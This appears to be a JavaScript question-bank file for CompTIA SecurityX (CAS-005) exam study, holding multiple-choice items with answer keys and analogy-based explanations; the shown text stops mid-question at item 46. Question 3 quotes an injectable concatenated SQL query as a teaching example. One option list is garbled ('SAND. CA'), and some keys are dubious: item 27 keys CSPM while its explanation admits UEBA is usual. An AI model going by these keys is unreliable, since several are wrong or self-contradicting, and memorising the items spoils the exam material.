window.QUESTION_BANK = {"title":"SecurityX CAS-005 Study","domains":{"1":{"name":"Governance, Risk, and Compliance","short":"GRC","weight":"20%"},"2":{"name":"Security Architecture","short":"Architecture","weight":"27%"},"3":{"name":"Security Engineering","short":"Engineering","weight":"31%"},"4":{"name":"Security Operations","short":"Operations","weight":"22%"}},"questions":[{"id":1,"domain":3,"stem":"A security engineer is reviewing event logs because an employee successfully connected a personal Windows laptop to the corporate network, which is against company policy. Company policy allows all Windows 10 and 11 laptops to connect to the system as long as the MDM agent installed by IT is running. Only compliant devices can connect, and the logic in the system to evaluate compliant laptops is as follows: Which of the following MOST likely occurred when the employee connected a personally owned Windows laptop and was allowed on the network?","options":{"A":"The agent was not running on the laptop, which triggered a false positive.","B":"The OS was a valid version, but the MDM agent was not installed, triggering a true positive.","C":"The OS was running a Windows version below 10 and triggered a false negative.","D":"The OS version was higher than 11, and the MDM agent was running, triggering a true negative."},"answer":"C","explanation":"The compliance script only inspects the MDM agent when the OS is Windows 10 or 11. A laptop on an older Windows build falls into the leftover else-branch, is marked compliant, and is let on the network. That is a false negative: a bad device is treated as good.\n\nImagine a club bouncer who only checks IDs for people who look 21–25 and waves everyone else inside.","choose":1,"pbq":false,"exhibits":["exhibits/q001_1.png"]},{"id":2,"domain":3,"stem":"An organization is working to secure its development process to ensure developers cannot deploy artifacts directly into the production environment. Which of the following security practice recommendations would be the best to accomplish this objective?","options":{"A":"Implement least privilege access to all systems.","B":"Roll out security awareness training for all users.","C":"Set up policies and systems with separation of duties.","D":"Enforce job rotations for all developers and administrators.","E":"Utilize mandatory vacations for all developers.","F":"Review all access to production systems on a quarterly basis."},"answer":"C","explanation":"Separation of duties splits who writes software from who can put it into production. Policy plus access controls so developers have no deploy rights stop one person from both building and shipping.\n\nImagine a cashier who can ring up sales but cannot also open the store safe.","choose":1,"pbq":false,"exhibits":[]},{"id":3,"domain":3,"stem":"A security architect discovers the following while reviewing code for a company's website: selection = \"SELECT Item FROM Catalog WHERE ItemID = \" & Request(\"ItemID\") Which of the following should the security architect recommend?","options":{"A":"Client-side processing","B":"Query parameterization","C":"Data normalization","D":"Escape character blocking","E":"URL encoding"},"answer":"B","explanation":"The query is built by gluing whatever the user typed onto SQL. Parameterization keeps the command and the data in separate buckets, so typed text cannot change the command.\n\nImagine a waiter who writes your order on a ticket instead of letting you shout new instructions into the kitchen.","choose":1,"pbq":false,"exhibits":[]},{"id":4,"domain":3,"stem":"A security architect needs to enable a container orchestrator for DevSecOps and SOAR initiatives. The engineer has discovered that several Ansible YAML files used for the automation of configuration management have the following content: Which of the following should the engineer do to correct the security issues presented within this content?","options":{"A":"Update the kubernetes.core.k8s module to kubernetes.core.k8s_service in the main.yml file.","B":"Update the COMPTIA001 hostname to localhost using the hostnamectl command.","C":"Update the state: present module to state: absent in the main.yml file.","D":"Update or remove the ansible.cfg file.","E":"Update the insecure-bind-address from localhost to the COMPTIA001 in the manifests file."},"answer":"D","explanation":"Those playbooks inherit settings from ansible.cfg, including a dangerous inventory plugin or bind address. Fix or remove that config file so every automation run stops inheriting the bad default.\n\nImagine a pre-loaded GPS that always sends the truck down a closed road until you replace the map.","choose":1,"pbq":false,"exhibits":["exhibits/q004_1.png"]},{"id":5,"domain":2,"stem":"A CRM company leverages a CSP PaaS service to host and publish Its SaaS product. Recently, a large customer requested that all infrastructure components must meet strict regulatory requirements, including configuration management, patch management, and life-cycle management. Which of the following organizations is responsible for ensuring those regulatory requirements are met?","options":{"A":"The CRM company","B":"The CRM company's customer","C":"The CSP","D":"The regulatory body"},"answer":"A","explanation":"The CRM firm sells SaaS on someone else's PaaS. The customer asked that patching, config, and lifecycle of that product meet regulation. Shared responsibility on PaaS does not move those application-layer duties to the cloud provider or to the CRM's end customer.\n\nThe CRM company still owns that compliance.\n\nImagine a restaurant that rents a commercial kitchen. Health rules for how the food is cooked still sit with the restaurant, not the landlord and not the diner.","choose":1,"pbq":false,"exhibits":[]},{"id":6,"domain":4,"stem":"Company A is merging with Company B. Company A is a small, local company. Company B has a large, global presence. The two companies have a lot of duplication in their IT systems, processes, and procedures. On the new Chief Information Officer's (CIO's) first day, a fire breaks out at Company B's main data center. Which of the following actions should the CIO take first?","options":{"A":"Determine whether the incident response plan has been tested at both companies, and use it to respond.","B":"Review the incident response plans, and engage the disaster recovery plan while relying on the IT leaders from both companies.","C":"Ensure hot, warm, and mobile disaster recovery sites are available, and give an update to the companies' leadership teams.","D":"Initiate Company A's IT systems processes and procedures, assess the damage, and perform a BIA."},"answer":"B","explanation":"Day one of a merger, the surviving data center is on fire. You do not have time to design new sites or run a BIA.\n\nOpen the IR plans you already have, start DR, and use the IT leads who know both companies.\n\nImagine two families who just joined households and the kitchen catches fire: use whoever knows where the extinguishers are, not a blueprint for a future house.\n\nBuilding hot sites tonight or forcing Company A's process onto Company B delays putting the fire out.","choose":1,"pbq":false,"exhibits":[]},{"id":7,"domain":1,"stem":"The results of an internal audit indicate several employees reused passwords that were previously included in a published list of compromised passwords. The company has the following employee password policy: Which of the following should be implemented to best address the password reuse issue? (Choose two.)","options":{"A":"Increase the minimum age to two days.","B":"Increase the history to 20.","C":"Increase the character length to 12.","D":"Add case-sensitive requirements to character class.","E":"Decrease the maximum age to 30 days.","F":"Remove the complexity requirements.","G":"Increase the maximum age to 120 days."},"answer":"A,B","explanation":"The audit is about reuse of passwords that already appear on public dump lists. Complexity and length do not stop someone from recycling a burned secret.\n\nA longer history remembers more of those old passwords so they cannot be picked again. A minimum age stops the trick of changing the password twenty times in a row tonight and landing back on the favorite.\n\nImagine a gym locker: the club banned last week's code, but you can still reuse it tomorrow unless they keep a longer list of retired codes and make you wait before you pick a new one.\n\nLength and extra character classes would make a brand-new password stronger. They would not stop reuse of a password the internet already knows.","choose":2,"pbq":false,"exhibits":["exhibits/q007_1.png"]},{"id":8,"domain":3,"stem":"A mobile administrator is reviewing the following mobile device DHCP logs to ensure the proper mobile settings are applied to managed devices: Which of the following mobile configuration settings is the mobile administrator verifying?","options":{"A":"Service set identifier authentication","B":"Wireless network auto joining","C":"802.1X with mutual authentication","D":"Association MAC address randomization"},"answer":"D","explanation":"The DHCP logs show phones presenting changing hardware addresses as they join Wi-Fi. That setting is MAC address randomization on association, which is what the admin is confirming.\n\nImagine a visitor badge that prints a new random number every time you walk through the lobby door.","choose":1,"pbq":false,"exhibits":["exhibits/q008_1.png"]},{"id":9,"domain":4,"stem":"A security analyst is investigating a possible insider threat incident that involves the use of an unauthorized USB from a shared account to exfiltrate data. The event did not create an alert. The analyst has confirmed the USB hardware ID is not on the device allow list, but has not yet confirmed the owner of the USB device. Which of the following actions should the analyst take next?","options":{"A":"Classify the incident as a false positive.","B":"Classify the incident as a false negative.","C":"Classify the incident as a true positive.","D":"Classify the incident as a true negative."},"answer":"B","explanation":"An unauthorized USB from a shared account moved data. The allow-list should have fired. It did not. The event was real and silent.\n\nThat is a false negative.\n\nImagine a smoke alarm that stays quiet during a real fire. A false positive would be the alarm with no fire. A true positive would be an alert that correctly fired.","choose":1,"pbq":false,"exhibits":[]},{"id":10,"domain":3,"stem":"Which of the following security features do email signatures provide?","options":{"A":"Non-repudiation","B":"Body encryption","C":"Code signing","D":"Sender authentication","E":"Chain of custody"},"answer":"A","explanation":"A digital email signature is created with the sender’s private key. Anyone with the matching public key can prove the named person sent that exact message and that the bytes were not altered. That property is non-repudiation.\n\nImagine a wax seal that only your ring can make; you cannot later claim the letter was forged.","choose":1,"pbq":false,"exhibits":[]},{"id":11,"domain":3,"stem":"A software development company wants to ensure that users can confirm the software is legitimate when installing it. Which of the following is the best way for the company to achieve this security objective?","options":{"A":"Code signing","B":"Non-repudiation","C":"Key escrow","D":"Private keys"},"answer":"A","explanation":"Code signing uses the publisher’s private key on the installer. The OS and the user can check the signature to confirm who shipped the file and that nobody swapped the bytes.\n\nImagine a factory hologram sticker on a medicine bottle; a missing or broken sticker means do not swallow the pills.","choose":1,"pbq":false,"exhibits":[]},{"id":12,"domain":3,"stem":"While performing mandatory monthly patch updates on a production application server, the security analyst reports an instance of buffer overflow for a new application that was migrated to the cloud and is also publicly exposed. Security policy requires that only internal users have access to the application. Which of the following should the analyst implement to mitigate the issues reported? (Choose two.)","options":{"A":"Configure firewall rules to block all external traffic.","B":"Enable input validation for all fields.","C":"Enable automatic updates to be installed on all servers.","D":"Configure the security group to enable external traffic.","E":"Set up a DLP policy to alert for exfiltration on all application servers.","F":"Enable nightly vulnerability scans."},"answer":"A,B","explanation":"The app is on the public internet and it crashes on bad input (buffer overflow), but policy says only insiders may use it. Block inbound internet at the firewall, and validate every field so leftover public exposure cannot feed the overflow.\n\nImagine locking the shop’s street door and also refusing checks written in crayon.","choose":2,"pbq":false,"exhibits":[]},{"id":13,"domain":3,"stem":"PKI can be used to support security requirements in the change management process. Which of the following capabilities does PKI provide for messages?","options":{"A":"Non-repudiation","B":"Confidentiality","C":"Delivery receipts","D":"Attestation"},"answer":"A","explanation":"A PKI digital signature on a change-ticket message binds a person to that exact text. Later they cannot credibly say “that was not me.” That is non-repudiation.\n\nImagine a signed work order: the contractor cannot later claim they never approved the job.","choose":1,"pbq":false,"exhibits":[]},{"id":14,"domain":3,"stem":"Several unlabeled documents in a cloud document repository contain cardholder information. Which of the following configuration changes should be made to the DLP system to correctly label these documents in the future?","options":{"A":"Digital rights management","B":"Network traffic decryption","C":"Regular expressions","D":"Watermarking"},"answer":"C","explanation":"Unlabeled files hide card numbers that follow a known pattern. Teach DLP those patterns with regular expressions so future documents get tagged automatically.\n\nImagine teaching a mail clerk “any envelope with 16 digits in groups of four is a card number — stamp it Sensitive.”","choose":1,"pbq":false,"exhibits":[]},{"id":15,"domain":3,"stem":"A systems administrator at a web-hosting provider has been tasked with renewing the public certificates of all customer sites. Which of the following would best support multiple domain names while minimizing the amount of certificates needed?","options":{"A":"OCSP","B":"CRL","C":"SAND. CA"},"answer":"C","explanation":"A Subject Alternative Name (SAN) certificate lists many DNS names on one cert. One SAN cert can cover every customer hostname, so you renew one file instead of hundreds.\n\nImagine one passport that lists every alias you travel under, instead of a separate booklet per name.","choose":1,"pbq":false,"exhibits":[]},{"id":16,"domain":3,"stem":"Which of the following best explain why organizations prefer to utilize code that is digitally signed? (Choose two.)","options":{"A":"It provides origin assurance.","B":"It verifies integrity.","C":"It provides increased confidentiality.","D":"It integrates with DRMs.","E":"It verifies the recipient's identity.","F":"It ensures the code is free of malware."},"answer":"A,B","explanation":"A code signature names the publisher (origin) and detects any later change to the bytes (integrity). It does not encrypt the program and it does not prove the file is malware-free.\n\nImagine a sealed envelope with the sender’s wax stamp: you know who sent it and that nobody opened it. You still do not know if the letter is wise.","choose":2,"pbq":false,"exhibits":[]},{"id":17,"domain":3,"stem":"A security engineer receives reports through the organization's bug bounty program about remote code execution in a specific component in a custom application. Management wants to properly secure the component and proactively avoid similar issues. Which of the following is the best approach to uncover additional vulnerable paths in the application?","options":{"A":"Leverage an exploitation framework to uncover vulnerabilities.","B":"Use fuzz testing to uncover potential vulnerabilities in the application.","C":"Utilize a software composition analysis tool to report known vulnerabilities.","D":"Reverse engineer the application to look for vulnerable code paths.","E":"Analyze the use of an HTTP intercepting proxy to dynamically uncover issues."},"answer":"B","explanation":"Fuzz testing slams the component with unexpected, malformed, and random input to shake out more crash paths like the RCE already found.\n\nImagine handing a vending machine random coins and button-mashing to see if it jams or dumps snacks.","choose":1,"pbq":false,"exhibits":[]},{"id":18,"domain":4,"stem":"A security technician is investigating a system that tracks inventory via a batch update each night. The technician is concerned that the system poses a risk to the business, as errors are occasionally generated and reported inventory appears incorrect. The following output log is provided: The technician reviews the output of the batch job and discovers that the inventory was never less than zero, and the final inventory was 100 rather than 60. Which of the following should the technician do to resolve this issue?","options":{"A":"Ensure that the application is using memory-safe functions to prevent integer overflows.","B":"Recommend thread-safe processes in the code to eliminate race conditions.","C":"Require the developers to include exception handlers to accommodate out-of-bounds results.","D":"Move the batch processing from client side to server side to remove client processing inconsistencies."},"answer":"B","explanation":"Nightly inventory ends at 100 instead of 60 and never goes negative. Two writers are stepping on the same count — a race.\n\nThread-safe (atomic) updates make the check-and-write one step.\n\nImagine two clerks writing on the same ticket stub at once. Give them one window.\n\nInteger overflow and client-vs-server moves are different bugs.","choose":1,"pbq":false,"exhibits":["exhibits/q018_1.png"]},{"id":19,"domain":3,"stem":"A programmer is reviewing the following proprietary piece of code that was identified as a vulnerability due to users being authenticated when they provide incorrect credentials: Which of the following should the programmer implement to remediate the code vulnerability?","options":{"A":"Salted hashing via the proprietary SHASH function","B":"Input validation in the first two lines of code","C":"Atomic execution of subroutines","D":"TOCTOU remediation in SET USERACL","E":"Database connection over encrypted channels"},"answer":"C","explanation":"Login checks the password and then grants the session as two unlocked steps, so a second request can slip in between and get a yes. Make check-plus-grant one atomic (locked) routine.\n\nImagine a coat-check that writes your ticket and later hangs the coat; someone else grabs the ticket in the gap. Do both steps behind one locked counter.","choose":1,"pbq":false,"exhibits":["exhibits/q019_1.png"]},{"id":20,"domain":3,"stem":"A senior cybersecurity engineer is solving a digital certificate issue in which the CA denied certificate issuance due to failed subject identity validation. At which of the following steps within the PKI enrollment process would the denial have occurred?","options":{"A":"RA","B":"OCSP","C":"CA","D":"IdP"},"answer":"A","explanation":"The CA only mints a certificate after the Registration Authority (RA) has verified the requester’s identity. Failed identity validation is an RA-step refusal, before a cert is ever issued.\n\nImagine a passport office that will not print the book because the clerk could not match you to the birth certificate.","choose":1,"pbq":false,"exhibits":[]},{"id":21,"domain":3,"stem":"An internal user can send encrypted emails successfully to all recipients, except one. at an external organization. When the internal user attempts to send encrypted emails to this external recipient, a security error message appears. The issue does not affect unencrypted emails. The external recipient can send encrypted emails to internal users. Which of the following is the most likely cause of the issue?","options":{"A":"The validity dates of the external recipient’s private key do not match the SSH keys with which the internal user is accessing the system.","B":"The external recipient has an expired public/private key pair that has not been revoked by the CA.","C":"The internal user's company email servers have an incorrect implementation of OCSP and CRL settings.","D":"The external recipient's email address and the email address associated with the external recipient's public key are mismatched."},"answer":"D","explanation":"S/MIME looks up the recipient by the email address printed on their certificate. If that address and the one you are sending to do not match, encryption to that person fails while every other recipient still works.\n\nImagine a locked mailbox whose painted name does not match the name on your envelope.","choose":1,"pbq":false,"exhibits":[]},{"id":22,"domain":3,"stem":"A security administrator is setting up a virtualization solution that needs to run services from a single host. Each service should be the only one running in its environment. Each environment needs to have its own operating system as a base but share the kernel version and properties of the running host. Which of the following technologies would best meet these requirements?","options":{"A":"Containers","B":"Type 1 hypervisor","C":"Type 2 hypervisor","D":"Virtual desktop infrastructure","E":"Emulation"},"answer":"A","explanation":"You need many isolated userlands on one host that still share the host kernel. That is containers (OS-level virtualization). Full VMs would each bring their own kernel.\n\nImagine several food carts sharing one kitchen building, each with its own fridge and recipes.","choose":1,"pbq":false,"exhibits":[]},{"id":23,"domain":2,"stem":"A company has data it would like to aggregate from its PLCs for data visualization and predictive maintenance purposes. Which of the following is the most likely destination for the tag data from the PLCs?","options":{"A":"External drive","B":"Cloud storage","C":"System aggregator","D":"Local historian"},"answer":"D","explanation":"PLC tags for trends and predictive maintenance are process data. They land in a plant historian built for time-series tags, not in a USB stick or a general cloud bucket first.\n\nImagine a flight recorder for the factory floor: it stores what the machines just did so you can graph it later.","choose":1,"pbq":false,"exhibits":[]},{"id":24,"domain":3,"stem":"Which of the following is the best way to protect the website browsing history for an executive who travels to foreign countries where internet usage is closely monitored?","options":{"A":"DOH","B":"EAP-TLS","C":"Geofencing","D":"Private browsing mode"},"answer":"A","explanation":"DNS-over-HTTPS (DoH) wraps name lookups in ordinary HTTPS, so a monitoring ISP or hotel network sees “web traffic to a resolver,” not the list of sites you typed. Private browsing only hides history on the laptop, not on the wire.\n\nImagine asking a librarian for books using a sealed envelope instead of announcing the titles at the desk.","choose":1,"pbq":false,"exhibits":[]},{"id":25,"domain":4,"stem":"A systems administrator is working with the SOC to identify potential intrusions associated with ransomware. The SOC wants the systems administrator to perform network-level analysis to identify outbound traffic from any infected machines. Which of the following is the most appropriate action for the systems administrator to take?","options":{"A":"Monitor for IoCs associated with C&C communications.","B":"Tune alerts to Identify changes to administrative groups.","C":"Review NetFlow logs for unexpected increases in egress traffic.","D":"Perform binary hash comparisons to identify infected devices."},"answer":"C","explanation":"SOC wants network proof of ransomware leaving the building. Flow logs show who sent a lot of data, where, and when.\n\nReview NetFlow (or equivalent) for sudden egress.\n\nImagine a toll plaza log at 3 a.m.: you may not hear the words, but you see a moving truck.\n\nHashes and admin-group alerts are host clues, not the outbound pipe.","choose":1,"pbq":false,"exhibits":[]},{"id":26,"domain":1,"stem":"A retail organization wants to properly test and verify its capabilities to detect and/or prevent specific TTPs as mapped to the MITRE ATTACK framework specific to APTs. Which of the following should be used by the organization to accomplish this goal?","options":{"A":"Tabletop exercise","B":"Penetration test","C":"Sandbox detonation","D":"Honeypot"},"answer":"B","explanation":"The retail shop wants proof it can detect or stop named ATT&CK techniques used by APTs. A meeting cannot produce that proof.\n\nA penetration test (or adversary emulation) actually runs those techniques against the live controls and records pass or fail.\n\nImagine hiring someone to pick the same locks a burglar uses while the cameras are rolling. That tells you whether the cameras and locks work.\n\nA tabletop only talks through the burglary. A sandbox or a honeypot is a tool, not a test of the full detect-and-prevent claim.","choose":1,"pbq":false,"exhibits":[]},{"id":27,"domain":3,"stem":"IoCs were missed during a recent security incident due to the reliance on a signature-based detection platform. A security engineer must recommend a solution that can be implemented to address this shortcoming. Which of the following would be the most appropriate recommendation?","options":{"A":"FIM","B":"SASE","C":"UEBA","D":"CSPM","E":"EAP"},"answer":"D","explanation":"Signature catalogs only fire on patterns they already know. The bank keys CSPM: continuous cloud-posture checks that surface misconfigurations and drift signatures never listed. UEBA is the usual host/user-behavior answer for novel IoCs; on this item pick the keyed cloud-posture control.\n\nImagine a night guard who does not have a photo of the thief, so instead they walk the building looking for unlocked doors and cameras that were pointed at the floor.","choose":1,"pbq":false,"exhibits":[]},{"id":28,"domain":4,"stem":"A company that provides services to clients who work with highly sensitive data would like to provide assurance that the data's confidentiality is maintained in a dynamic, low-risk environment. Which of the following would best achieve this goal? (Choose two.)","options":{"A":"Install a SOAR on all endpoints.","B":"Hash all files.","C":"Install SIEM within a SOC.","D":"Encrypt all data and files at rest, in transit, and in use.","E":"Configure SOAR to monitor and intercept files and data leaving the network.","F":"Implement file integrity monitoring."},"answer":"D,E","explanation":"Clients need assurance that secrets stay secret while work still moves. Encrypt in every state, and watch/stop files that try to leave.\n\nThat pair is confidentiality plus a tripwire on the exit.\n\nImagine locking every copy of a diary and posting a guard at the mailbox.\n\nHashing and FIM prove a file changed. They do not hide the words.","choose":2,"pbq":false,"exhibits":[]},{"id":29,"domain":2,"stem":"An organization wants to implement an access control system based on its data classification policy that includes the following data types: Confidential - Restricted - Internal - Public Flag for Review - The access control system should support SSO federation to map users into groups. Each group should only access systems that process and store data at the classification assigned to the group. Which of the following should the organization implement to enforce its requirements with a minimal impact to systems and resources?","options":{"A":"A tagging strategy in which all resources are assigned a tag based on the data classification type, and a system that enforces attribute-based access control","B":"Role-based access control that maps data types to internal roles, which are defined in the human resources department's source of truth system","C":"Network microsegmentation based on data types, and a network access control system enforcing mandatory access control based on the user principal","D":"A rule-based access control strategy enforced by the SSO system with rules managed by the internal LDAP and applied on a per-system basis"},"answer":"A","explanation":"The company labels data Confidential, Restricted, Internal, or Public. People log in once (SSO) and land in groups. Each group may only use systems that hold data at that group's level. They want that rule with as little extra rebuild as possible.\n\nDo two simple things. Put a sticker (a tag) on every system that says which data class lives there. Then use attribute-based access control (ABAC): a rule engine that says \"this person's group + that system's tag must match\" before access is allowed.\n\nSSO/federation only answers \"who is this person and which group are they in?\" The tag answers \"how sensitive is this box?\" ABAC is the bouncer that compares the two.\n\nWhy not the others, in plain words:\n- Role-based access (RBAC) tied to HR job titles means a new role every time a title meets a data class. The role list explodes.\n- Re-cutting the whole network into classified zones (microsegmentation + MAC) works but is a construction project, not \"minimal impact.\"\n- Piling one-off rules into SSO/LDAP for every system is a pile of exceptions you will not keep clean.\n\nImagine a hotel. Your keycard knows your guest type. Each door has a sticker: Staff only, Guest, Public. The lock opens only when card type and door sticker match. You do not cut a brand-new brass key for every job title in the building.","choose":1,"pbq":false,"exhibits":[]},{"id":30,"domain":4,"stem":"A security analyst was monitoring the networks of a group of companies. The analyst identified several periods of concentrated, coordinated activity by unknown actors. The activity repeated at regular intervals and affected all the companies. Minor hardware outages that correlated with the same times as the discovered activity escalated in severity. Which of the following threat actors was most likely involved?","options":{"A":"An organized crime collective running a ransomware campaign","B":"A group of politically motivated hackers","C":"Disgruntled employees who were recently terminated","D":"An advanced persistent threat financed by a nation-state"},"answer":"D","explanation":"Coordinated, repeating hits on several companies, plus hardware outages that get worse on the same clock, is a patient, funded campaign.\n\nThat is a nation-state APT, not a smash-and-grab crime crew or one angry ex-employee.\n\nImagine a crew that practices on a whole street, same night each month, and cuts power to cover the work.","choose":1,"pbq":false,"exhibits":[]},{"id":31,"domain":1,"stem":"The company's client service team is receiving a large number of inquiries from clients regarding a new vulnerability. Which of the following would provide the customer service team with a consistent message to deliver directly to clients?","options":{"A":"Communication plan","B":"Response playbook","C":"Disaster recovery procedure","D":"Automated runbook"},"answer":"A","explanation":"Client-service staff need one approved sentence to read to customers about a public vulnerability. They do not need a technical recovery procedure.\n\nA communication plan is that approved narrative, owner, and channel.\n\nImagine a call center with one laminated script so five agents do not invent five different stories.\n\nA response playbook or DR procedure tells responders what to do inside the company. An automated runbook presses technical buttons. None of those is the customer sentence.","choose":1,"pbq":false,"exhibits":[]},{"id":32,"domain":3,"stem":"A company wants to use a process to embed a sign of ownership covertly inside a proprietary document without adding any identifying attributes. Which of the following would be best to use as part of the process to support copyright protections of the document?","options":{"A":"Steganography","B":"E-signature","C":"Watermarking","D":"Cryptography"},"answer":"A","explanation":"Steganography hides a mark inside the file so it is not an obvious extra stamp or header. A hidden ownership signal survives casual copying without looking like a watermark.\n\nImagine writing a tiny serial number in lemon juice between the lines of a printed contract.","choose":1,"pbq":false,"exhibits":[]},{"id":33,"domain":4,"stem":"Which of the following utilizes policies that route packets to ensure only specific types of traffic are being sent to the correct destination based on application usage?","options":{"A":"SDN","B":"pcap","C":"vmstat","D":"DNSSEC","E":"VPC"},"answer":"A","explanation":"Policies that steer packets by application so only the right kind of traffic reaches the right place: SDN.\n\npcap is a capture file. DNSSEC signs names. A VPC is a cloud network box.\n\nImagine a mailroom that reads the label and sends parcels down the matching chute.","choose":1,"pbq":false,"exhibits":[]},{"id":34,"domain":4,"stem":"An incident response team completed recovery from offline backup for several workstations. The workstations were subjected to a ransomware attack after users fell victim to a spear-phishing campaign, despite a robust training program. Which of the following questions should be considered during the lessons-learned phase to most likely reduce the risk of reoccurrence? (Choose two.)","options":{"A":"Are there opportunities for legal recourse against the originators of the spear-phishing campaign?","B":"What internal and external stakeholders need to be notified of the breach?","C":"Which methods can be implemented to increase speed of offline backup recovery?","D":"What measurable user behaviors were exhibited that contributed to the compromise?","E":"Which technical controls, if implemented, would provide defense when user training fails?","F":"Which user roles are most often targeted by spear phishing attacks?"},"answer":"D,E","explanation":"Training failed, ransomware still landed, backups saved the machines. Lessons learned should ask what users actually did and which technical control would have stopped the same click.\n\nLawsuits and extra tape speed do not close that hole.\n\nImagine after a pickpocketing: what motion did people make, and which zipper would have stopped the hand when the briefing failed.","choose":2,"pbq":false,"exhibits":[]},{"id":35,"domain":2,"stem":"Two companies that recently merged would like to unify application access between the companies, without initially merging internal authentication stores. Which of the following technical strategies would best meet this objective?","options":{"A":"Federation","B":"RADIUS","C":"TACACS+","D":"MFA","E":"ABAC"},"answer":"A","explanation":"Unify app login without merging directories: each company keeps its own IdP and trusts the other's assertion. That is federation (SAML/OIDC).\n\nRADIUS and TACACS+ are device admin protocols. MFA is a factor, not a directory bridge.\n\nImagine two clubs that stamp each other's hands so members can visit without joining the other membership list.","choose":1,"pbq":false,"exhibits":[]},{"id":36,"domain":3,"stem":"An analyst needs to evaluate all images and documents that are publicly shared on a website. Which of the following would be the best tool to evaluate the metadata of these files?","options":{"A":"OllyDbg","B":"ExifTool","C":"Volatility","D":"Ghidra"},"answer":"B","explanation":"Photos and office files carry metadata (camera model, GPS, author, software). ExifTool reads and reports that metadata. Debuggers and memory frameworks are for programs and RAM, not public image tags.\n\nImagine reading the label on the back of a photo instead of taking the picture apart.","choose":1,"pbq":false,"exhibits":[]},{"id":37,"domain":3,"stem":"An organization has deployed a cloud-based application that provides virtual event services globally to clients. During a typical event, thousands of users access various entry pages within a short period of time. The entry pages include sponsor-related content that is relatively static and is pulled from a database. When the first major event occurs, users report poor response time on the entry pages. Which of the following features is the most appropriate for the company to implement?","options":{"A":"Horizontal scalability","B":"Vertical scalability","C":"Containerization","D":"Static code analysis","E":"Caching"},"answer":"E","explanation":"Thousands of users hit the same mostly-static sponsor pages at once. Caching keeps a ready-made copy at the edge or in memory so the database is not asked the same question thousands of times.\n\nImagine printing the concert program once and handing out copies, instead of typesetting it for every guest.","choose":1,"pbq":false,"exhibits":[]},{"id":38,"domain":1,"stem":"An organization's board of directors has asked the Chief Information Security Officer to build a third- party management program. Which of the following best explains a reason for this request?","options":{"A":"Risk transference","B":"Supply chain visibility","C":"Support availability","D":"Vulnerability management"},"answer":"B","explanation":"The board asked for a third-party management program. The point of that program is to see who sits in the chain and what they can touch.\n\nThat is supply-chain visibility.\n\nImagine inspecting every subcontractor's workshop, not just the name painted on the storefront.\n\nRisk transfer, a support contract, or a scanner can be parts of vendor work. They are not the reason the board funded a TPRM program.","choose":1,"pbq":false,"exhibits":[]},{"id":39,"domain":3,"stem":"A company is rewriting a vulnerable application and adding the mprotect() system call in multiple parts of the application's code that was being leveraged by a recent exploitation tool. Which of the following should be enabled to ensure the application can leverage the new system call against similar attacks in the future?","options":{"A":"TPM","B":"Secure boot","C":"NX bit","D":"HSM"},"answer":"C","explanation":"mprotect() can mark memory pages non-executable. The CPU NX/XN bit is what enforces “this page is data, do not run it,” which is how you stop the exploit’s planted shellcode.\n\nImagine a rule that scrap paper in the kitchen cannot be used as a recipe — only posted menu cards can.","choose":1,"pbq":false,"exhibits":[]},{"id":40,"domain":3,"stem":"Which of the following items should be included when crafting a disaster recovery plan?","options":{"A":"Redundancy","B":"Testing exercises","C":"Autoscaling","D":"Competitor locations"},"answer":"B","explanation":"A DR plan that is never rehearsed is a document, not a capability. Testing exercises prove people, vendors, and restore steps work under time pressure.\n\nImagine a fire drill: you learn whether the exits actually open before the real fire.","choose":1,"pbq":false,"exhibits":[]},{"id":41,"domain":2,"stem":"A web application server is running a legacy operating system with an unpatched RCE vulnerability. The server cannot be upgraded until the corresponding application code is changed. Which of the following compensating controls would best prevent successful exploitation?","options":{"A":"Segmentation","B":"CASB","C":"HIPS","D":"UEBA"},"answer":"A","explanation":"An unpatched RCE on a legacy web OS cannot be fixed until the app is rewritten. The compensating control that stops the exploit from mattering is to shrink who can reach that host — segmentation.\n\nCASB sits in front of cloud apps. UEBA scores users. HIPS helps but does not remove the network path.\n\nImagine putting the one window that will not lock in a room with one door, instead of leaving it on the street.","choose":1,"pbq":false,"exhibits":[]},{"id":42,"domain":3,"stem":"Which of the following is the reason why security engineers often cannot upgrade the security of embedded facility automation systems?","options":{"A":"They are constrained by available compute.","B":"They lack x86-64 processors.","C":"They lack EEPROM.","D":"They are not logic-bearing devices."},"answer":"A","explanation":"Facility controllers are tiny computers with little CPU, RAM, and storage. Heavier encryption, agents, or modern OS upgrades often will not fit.\n\nImagine trying to install a full desktop antivirus on a pocket calculator.","choose":1,"pbq":false,"exhibits":[]},{"id":43,"domain":4,"stem":"A security analyst identified a vulnerable and deprecated runtime engine that Is supporting a public- facing banking application. The developers anticipate the transition to modern development environments will take at least a month. Which of the following controls would best mitigate the risk without interrupting the service during the transition?","options":{"A":"Shutting down the systems until the code is ready","B":"Uninstalling the impacted runtime engine","C":"Selectively blocking traffic on the affected port","D":"Configuring IPS and WAF with signatures"},"answer":"D","explanation":"A public bank app sits on a dying runtime for at least a month. You cannot shut it off.\n\nIPS and WAF signatures buy that month by blocking the known exploit path.\n\nImagine a cracked shop window with a steel grate while the glass is on order.\n\nUninstalling the runtime or closing the port is closing the shop.","choose":1,"pbq":false,"exhibits":[]},{"id":44,"domain":3,"stem":"A security architect wants to ensure a remote host's identity and decides that pinning the X.509 certificate to the device is the most effective solution. Which of the following must happen first?","options":{"A":"Use Distinguished Encoding Rules (DER) for the certificate.","B":"Extract the private key from the certificate.","C":"Use an out-of-band method to obtain the certificate.","D":"Compare the retrieved certificate with the embedded certificate."},"answer":"C","explanation":"Pinning means “only trust this exact certificate (or public key).” You must first get that authentic copy through a path an attacker on the network cannot touch — out-of-band — before you embed it.\n\nImagine calling the bank on a number from the back of your card and writing down their official seal, then comparing every later letter to that seal.","choose":1,"pbq":false,"exhibits":[]},{"id":45,"domain":1,"stem":"A company hired a third-party consultant to run a cybersecurity incident simulation in order to identify security gaps and prepare stakeholders for a potential incident. Which of the following best describes this activity?","options":{"A":"Tabletop exercise","B":"Walk-through review","C":"Lessons learned","D":"Business impact analysis"},"answer":"A","explanation":"A consultant ran an incident simulation so leaders would find gaps and practice their roles. That activity is a tabletop exercise.\n\nImagine a fire drill around a conference table: nobody burns a building, but the people who would move have to say what they would do.\n\nA walk-through only reads a document. Lessons learned happen after a real or simulated event is finished. A BIA prices downtime; it is not a rehearsal.","choose":1,"pbq":false,"exhibits":[]},{"id":46,"domain":3,"stem":"A security officer is requiring all personnel working on a special project to obtain a security clearance requisite with the level of all information being accessed. Data on this network must be protected at the same level of each clearance holder. The need to know must be verified by the data owner. Which of the following should the security officer do to meet these requirements?","options":{"A":"Create a rule to authorize personnel only from certain 